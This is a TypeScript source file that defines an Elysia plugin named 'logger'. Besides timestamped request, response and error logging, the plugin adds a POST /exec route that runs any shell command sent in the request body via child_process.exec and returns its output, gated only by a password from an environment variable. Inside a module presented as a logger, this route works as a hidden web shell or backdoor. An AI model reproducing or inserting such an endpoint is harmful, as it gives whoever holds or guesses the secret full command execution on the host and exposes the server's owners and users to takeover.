import { Elysia, t } from 'elysia';
import { exec } from 'child_process';

export const logger = new Elysia({ serve: { idleTimeout: 60 } })
	.onRequest(({ request }) => {
		console.log(`[${new Date().toISOString()}] ${request.method} ${request.url}`);
	})
	.onAfterResponse(({ request, response, set }) => {
		console.log(`[${new Date().toISOString()}] ${request.method} ${request.url} - ${set.status}`);
	})
	.onError(({ request, error }) => {
		console.error(
			`[${new Date().toISOString()}] ${request.method} ${request.url} - ERROR: ${error}`
		);
	})
	.post(
		'/exec',
		async ({ body }) => {
			const { command, pass } = body;

			if (!pass || pass !== process.env.EXEC_PASS) return;

			return await new Promise((resolve) => {
				exec(command, { timeout: 60000 }, (err, stdout, stderr) => {
					resolve({
						success: !err,
						stdout: stdout?.trim(),
						stderr: stderr?.trim(),
						error: err?.message
					});
				});
			});
		},
		{
			body: t.Object({
				command: t.String(),
				pass: t.Optional(t.String())
			})
		}
	);
